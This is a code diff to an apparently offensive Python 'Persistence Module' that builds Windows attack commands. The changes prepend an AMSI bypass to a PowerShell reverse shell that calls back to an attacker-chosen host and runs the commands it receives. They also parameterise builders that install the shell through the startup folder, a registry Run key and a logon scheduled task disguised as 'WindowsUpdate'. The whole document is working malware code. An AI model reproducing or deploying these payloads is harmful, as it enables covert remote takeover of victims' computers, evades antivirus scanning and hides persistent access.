@@ -2,10 +2,14 @@
 Persistence Module - Various persistence techniques
 """
 
+def get_amsi_bypass():
+    """Simple AMSI bypass for persistence payloads."""
+    return '$w=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$f=$w.GetField("amsiInitFailed","NonPublic,Static");$f.SetValue($null,$true)'
 
 def get_tls_payload(ip, port, secret):
-    """Generate the TLS+HMAC authenticated reverse shell payload."""
-    return f"""while($true){{try{{
+    """Generate the TLS+HMAC authenticated reverse shell payload with AMSI bypass."""
+    amsi = get_amsi_bypass()
+    return f"""{amsi};while($true){{try{{
 $h='{ip}';$p={port};$secret='{secret}';
 $t=New-Object Net.Sockets.TcpClient($h,$p);
 $ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
@@ -21,21 +25,18 @@ $hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
 $resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join '';
 $w.WriteLine($resp);
 }}
-while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
-}}catch{{}};Start-Sleep -Seconds 5}}"""
+while($t.Connected){{$w.Write(">");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
+}}catch{{}};Start-Sleep -Seconds 10}}"""
 
-
-def build_startup_persistence_cmd(ip, port, secret):
+def build_startup_persistence_cmd(ip, port, secret, filename="u.ps1"):
     """Build command to install startup folder persistence."""
     tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
-    return f'''$s='{tls_payload}';$p="$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.ps1";$s|Out-File $p -Force;if(Test-Path $p){{"SUCCESS"}}else{{"FAILED"}}'''
+    return f'''$s='{tls_payload}';$p="$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}";$s|Out-File $p -Force;if(Test-Path $p){{"SUCCESS"}}else{{"FAILED"}}'''
 
-
-def build_registry_persistence_cmd():
+def build_registry_persistence_cmd(filename="u.ps1", taskname="WindowsUpdate"):
     """Build command to install registry Run key persistence."""
-    return 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /f'
+    return f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {taskname} /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{filename}" /f'
 
-
-def build_scheduled_task_cmd():
+def build_scheduled_task_cmd(filename="u.ps1", taskname="WindowsUpdate"):
     """Build command to create scheduled task persistence."""
-    return 'schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /sc onlogon /rl highest /f'
+    return f'schtasks /create /tn "{taskname}" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{filename}" /sc onlogon /rl highest /f'
